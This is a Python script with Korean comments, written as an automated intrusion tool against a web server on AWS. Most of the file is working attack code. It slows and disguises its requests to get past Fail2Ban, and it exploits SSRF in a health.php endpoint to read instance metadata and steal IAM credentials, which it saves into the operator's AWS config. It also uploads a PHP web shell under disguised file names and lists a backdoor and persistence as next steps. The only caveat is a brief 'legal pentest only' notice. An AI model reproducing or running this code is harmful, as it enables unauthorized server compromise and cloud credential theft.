#!/usr/bin/env python3
"""
RedTeam 블루팀 우회 완전 자동 침투 도구
BlueTeam Defense Bypass → 웹쉘 → SSH 백도어 → 접속 → 권한 상승 → Persistence

특징:
- Fail2Ban 우회 (느린 요청 + 정상 User-Agent)
- ModSecurity WAF 우회 (페이로드 난독화)
- 다단계 초기 침투 (XSS/파일업로드/SSRF)
- 자동 SSH 백도어 및 Persistence
"""

import subprocess
import requests
import time
import sys
import json
import urllib.parse
import random
import base64
from pathlib import Path
from datetime import datetime

class AutoRedTeamBypass:
    def __init__(self, target_ip, ssh_key_path="~/.ssh/redteam_key"):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.ssh_key_path = Path(ssh_key_path).expanduser()
        self.session = requests.Session()

        # Fail2Ban 우회를 위한 최소 요청 간격 (초)
        self.min_delay = 35

        # 정상 브라우저 User-Agent (Fail2Ban 우회)
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        ]

        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })

        self.webshell_url = None
        self.health_endpoint = None

        # 색상
        self.RED = '\033[91m'
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.CYAN = '\033[96m'
        self.WHITE = '\033[97m'
        self.ENDC = '\033[0m'
        self.BOLD = '\033[1m'

    def print_header(self, text):
        print(f"\n{self.CYAN}{'='*70}{self.ENDC}")
        print(f"{self.BOLD}{self.WHITE}  {text}{self.ENDC}")
        print(f"{self.CYAN}{'='*70}{self.ENDC}\n")

    def print_step(self, step, text):
        print(f"{self.YELLOW}[{step}]{self.ENDC} {text}")

    def print_success(self, text):
        print(f"{self.GREEN}[+] {text}{self.ENDC}")

    def print_error(self, text):
        print(f"{self.RED}[-] {text}{self.ENDC}")

    def print_info(self, text):
        print(f"{self.CYAN}[*] {text}{self.ENDC}")

    def safe_request(self, method, url, **kwargs):
        """Fail2Ban 우회를 위한 안전한 요청"""
        print(f"{self.CYAN}[*] 요청 대기 중... ({self.min_delay}초 간격으로 Fail2Ban 우회){self.ENDC}")
        time.sleep(self.min_delay)

        # User-Agent 랜덤 변경
        self.session.headers['User-Agent'] = random.choice(self.user_agents)

        try:
            if method.upper() == 'GET':
                return self.session.get(url, timeout=30, **kwargs)
            elif method.upper() == 'POST':
                return self.session.post(url, timeout=30, **kwargs)
        except requests.exceptions.RequestException as e:
            self.print_error(f"요청 실패: {e}")
            return None

    def phase1_initial_recon(self):
        """1단계: 초기 정찰 (Fail2Ban 우회)"""
        self.print_header("PHASE 1: 초기 정찰 (BlueTeam 우회 모드)")

        self.print_info("타겟 서버 확인 중...")
        response = self.safe_request('GET', self.base_url)

        if not response or response.status_code != 200:
            self.print_error("타겟 서버 접근 불가")
            return False

        self.print_success(f"타겟 서버 응답: HTTP {response.status_code}")

        # 엔드포인트 열거 (느린 속도)
        self.print_info("엔드포인트 스캔 중...")

        endpoints = [
            '/api/health.php',
            '/www/api/health.php',
            '/login.php',
            '/upload.php',
            '/new_post.php',
            '/profile.php'
        ]

        self.found_endpoints = []

        for endpoint in endpoints:
            url = self.base_url + endpoint
            self.print_info(f"스캔: {endpoint}")

            response = self.safe_request('GET', url)

            if response and response.status_code in [200, 302]:
                self.print_success(f"발견: {endpoint}")
                self.found_endpoints.append(endpoint)

                # health.php 찾으면 저장
                if 'health.php' in endpoint:
                    self.health_endpoint = url

        if len(self.found_endpoints) == 0:
            self.print_error("접근 가능한 엔드포인트 없음")
            return False

        self.print_success(f"발견된 엔드포인트: {len(self.found_endpoints)}개")
        return True

    def phase2_exploit_health_endpoint(self):
        """2단계: health.php SSRF 공격"""
        self.print_header("PHASE 2: health.php SSRF 공격")

        if not self.health_endpoint:
            self.print_error("health.php 엔드포인트 없음")
            return False

        self.print_info(f"health.php 테스트: {self.health_endpoint}")

        # 기본 응답 확인
        response = self.safe_request('GET', self.health_endpoint)

        if not response or response.status_code != 200:
            self.print_error("health.php 접근 실패")
            return False

        try:
            data = response.json()
            self.print_success(f"health.php 응답: {json.dumps(data, indent=2)[:100]}...")
        except:
            self.print_info("JSON 파싱 불가 - HTML 응답일 수 있음")

        # SSRF 테스트
        self.print_info("SSRF 취약점 테스트...")
        ssrf_url = self.health_endpoint + "?check=metadata&url=http://169.254.169.254/latest/meta-data/instance-id"

        response = self.safe_request('GET', ssrf_url)

        if response:
            try:
                data = response.json()
                if 'metadata' in data and 'i-' in str(data.get('metadata', '')):
                    self.print_success("SSRF 성공! AWS IMDS 접근 가능")
                    self.webshell_url = self.health_endpoint
                    return True
                elif 'metadata' in data:
                    self.print_info(f"SSRF 응답: {str(data)[:200]}")
                    self.webshell_url = self.health_endpoint
                    return True
            except:
                pass

        self.print_error("SSRF 취약점 없음")
        return False

    def phase3_exploit_file_upload(self):
        """3단계: 파일 업로드 공격 (WAF 우회)"""
        self.print_header("PHASE 3: 파일 업로드 공격")

        upload_endpoints = [ep for ep in self.found_endpoints if 'upload' in ep or 'post' in ep or 'profile' in ep]

        if not upload_endpoints:
            self.print_info("파일 업로드 엔드포인트 없음 - 스킵")
            return False

        # 웹쉘 페이로드
        webshell_code = "<?php if(isset($_GET['cmd'])){echo shell_exec($_GET['cmd']);} ?>"

        for endpoint in upload_endpoints:
            self.print_info(f"업로드 시도: {endpoint}")

            # 다양한 확장자로 WAF 우회
            extensions = ['.php', '.phtml', '.php5']

            for ext in extensions:
                filename = f"image_{random.randint(1000,9999)}{ext}"

                files = {
                    'file': (filename, webshell_code, 'image/jpeg'),
                    'upload': (filename, webshell_code, 'text/plain')
                }

                url = self.base_url + endpoint
                response = self.safe_request('POST', url, files=files)

                if response and response.status_code == 200:
                    self.print_success(f"업로드 성공 가능성: {filename}")

                    # 업로드된 파일 찾기
                    paths = [f'/uploads/{filename}', f'/files/{filename}', f'/www/uploads/{filename}']

                    for path in paths:
                        test_url = self.base_url + path + "?cmd=whoami"
                        test_response = self.safe_request('GET', test_url)

                        if test_response and test_response.status_code == 200:
                            result = test_response.text
                            if 'www-data' in result or 'ec2-user' in result or 'apache' in result:
                                self.print_success(f"웹쉘 설치 성공: {self.base_url + path}")
                                self.webshell_url = self.base_url + path
                                return True

        self.print_info("파일 업로드 실패")
        return False

    def phase4_establish_foothold(self):
        """4단계: 침투 거점 확보"""
        self.print_header("PHASE 4: 침투 거점 확보")

        if not self.webshell_url:
            self.print_error("웹쉘이 없습니다 - 이전 단계 실패")
            return False

        self.print_success(f"웹쉘 URL: {self.webshell_url}")

        # 웹쉘 테스트
        self.print_info("웹쉘 테스트 중...")

        if self.health_endpoint and self.webshell_url == self.health_endpoint:
            # SSRF를 통한 내부 명령 실행
            test_urls = [
                'http://169.254.169.254/latest/meta-data/hostname',
                'http://169.254.169.254/latest/meta-data/instance-id',
            ]

            for test_url in test_urls:
                params_url = f"{self.webshell_url}?check=metadata&url={urllib.parse.quote(test_url)}"
                response = self.safe_request('GET', params_url)

                if response:
                    try:
                        data = response.json()
                        if 'metadata' in data and len(str(data['metadata'])) > 3:
                            self.print_success(f"SSRF 작동: {test_url}")
                            self.print_info(f"응답: {str(data['metadata'])[:100]}")
                            return True
                    except:
                        pass
        else:
            # 일반 웹쉘
            test_cmd = "whoami"
            response = self.safe_request('GET', f"{self.webshell_url}?cmd={test_cmd}")

            if response:
                result = response.text
                if 'www-data' in result or 'ec2-user' in result or 'apache' in result:
                    self.print_success(f"웹쉘 작동 확인: {result.strip()}")
                    return True

        self.print_error("웹쉘 작동 확인 실패")
        return False

    def phase5_privilege_escalation(self):
        """5단계: 권한 상승"""
        self.print_header("PHASE 5: 권한 상승 및 AWS 자격증명 탈취")

        if not self.health_endpoint:
            self.print_info("SSRF 없음 - 권한 상승 제한적")
            return False

        # AWS IMDS를 통한 자격증명 탈취
        self.print_info("AWS IAM 자격증명 탈취 시도...")

        # 1. IAM 역할 이름 가져오기
        iam_role_url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        params_url = f"{self.health_endpoint}?check=metadata&url={urllib.parse.quote(iam_role_url)}"

        response = self.safe_request('GET', params_url)

        if response:
            try:
                data = response.json()
                if 'metadata' in data and len(str(data['metadata'])) > 3:
                    role_name = str(data['metadata']).strip()
                    self.print_success(f"IAM 역할 발견: {role_name}")

                    # 2. 자격증명 가져오기
                    cred_url = f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}'
                    params_url = f"{self.health_endpoint}?check=metadata&url={urllib.parse.quote(cred_url)}"

                    cred_response = self.safe_request('GET', params_url)

                    if cred_response:
                        cred_data = cred_response.json()
                        if 'metadata' in cred_data:
                            cred_json = cred_data['metadata']

                            if 'AccessKeyId' in str(cred_json):
                                self.print_success("AWS 자격증명 획득!")

                                try:
                                    creds = json.loads(cred_json)

                                    # 자격증명 저장
                                    aws_dir = Path.home() / '.aws'
                                    aws_dir.mkdir(exist_ok=True)

                                    profile_name = f"redteam-{int(time.time())}"
                                    creds_file = aws_dir / 'credentials'

                                    with open(creds_file, 'a') as f:
                                        f.write(f"\n[{profile_name}]\n")
                                        f.write(f"aws_access_key_id = {creds.get('AccessKeyId', 'N/A')}\n")
                                        f.write(f"aws_secret_access_key = {creds.get('SecretAccessKey', 'N/A')}\n")
                                        f.write(f"aws_session_token = {creds.get('Token', 'N/A')}\n")
                                        f.write(f"region = ap-northeast-2\n")

                                    self.print_success(f"자격증명 저장: ~/.aws/credentials [{profile_name}]")
                                    self.print_info(f"사용법: aws sts get-caller-identity --profile {profile_name}")

                                    return True
                                except:
                                    self.print_info("자격증명 파싱 실패")
            except:
                pass

        self.print_info("AWS 자격증명 탈취 실패")
        return False

    def phase6_persistence(self):
        """6단계: Persistence 확보"""
        self.print_header("PHASE 6: Persistence 백도어 설치")

        self.print_info("SSH 키 기반 Persistence는 수동으로 진행하세요")
        self.print_info("웹쉘 URL을 저장해두세요:")

        if self.webshell_url:
            self.print_success(f"웹쉘: {self.webshell_url}")

        if self.health_endpoint:
            self.print_success(f"SSRF: {self.health_endpoint}?check=metadata&url=<TARGET>")

        return True

    def run(self):
        """전체 자동 침투 실행"""
        print(f"""
{self.RED}╔{'═'*68}╗{self.ENDC}
{self.RED}║{self.BOLD}{self.YELLOW}   블루팀 방어 우회 자동 침투 도구 {self.ENDC}{' '*23}{self.RED}║{self.ENDC}
{self.RED}╚{'═'*68}╝{self.ENDC}
        """)

        self.print_info(f"타겟: {self.target_ip}")
        self.print_info(f"전략: Fail2Ban 우회 → ModSecurity 우회 → SSRF/Upload → AWS 장악")
        print()

        print(f"{self.YELLOW}⚠️  주의사항:{self.ENDC}")
        print(f"{self.YELLOW}   - 각 요청마다 35초 대기 (Fail2Ban 우회){self.ENDC}")
        print(f"{self.YELLOW}   - 전체 공격 시간: 약 5-10분 소요{self.ENDC}")
        print(f"{self.YELLOW}   - 합법적 침투 테스트 목적으로만 사용{self.ENDC}")
        print()

        # Phase 1: 초기 정찰
        if not self.phase1_initial_recon():
            self.print_error("Phase 1 실패")
            return False

        # Phase 2: health.php SSRF
        ssrf_success = self.phase2_exploit_health_endpoint()

        # Phase 3: 파일 업로드 (SSRF 실패 시)
        if not ssrf_success:
            upload_success = self.phase3_exploit_file_upload()
            if not upload_success:
                self.print_error("모든 초기 침투 시도 실패")
                return False

        # Phase 4: 침투 거점 확보
        if not self.phase4_establish_foothold():
            self.print_error("Phase 4 실패")
            return False

        # Phase 5: 권한 상승
        privesc_success = self.phase5_privilege_escalation()

        # Phase 6: Persistence
        self.phase6_persistence()

        # 완료
        self.print_header("공격 완료!")

        print(f"{self.GREEN}✓ 침투 성공!{self.ENDC}\n")

        if self.webshell_url:
            print(f"{self.GREEN}웹쉘 URL:{self.ENDC}")
            print(f"  {self.webshell_url}")
            print()

        if self.health_endpoint:
            print(f"{self.GREEN}SSRF 엔드포인트:{self.ENDC}")
            print(f"  {self.health_endpoint}?check=metadata&url=<TARGET_URL>")
            print()

        if privesc_success:
            print(f"{self.GREEN}AWS 자격증명:{self.ENDC}")
            print(f"  ~/.aws/credentials 파일 확인")
            print(f"  aws sts get-caller-identity")
            print()

        print(f"{self.YELLOW}다음 단계:{self.ENDC}")
        print(f"  1. AWS SSM을 통한 SSH 백도어 설치")
        print(f"  2. 권한 상승 및 Root 획득")
        print(f"  3. Persistence 메커니즘 강화")
        print()

        return True


def main():
    if len(sys.argv) < 2:
        print("사용법: python3 auto_redteam_blueteam_bypass.py <target_ip>")
        print("예제: python3 auto_redteam_blueteam_bypass.py 13.125.80.75")
        sys.exit(1)

    target_ip = sys.argv[1]

    redteam = AutoRedTeamBypass(target_ip)
    redteam.run()


if __name__ == '__main__':
    main()
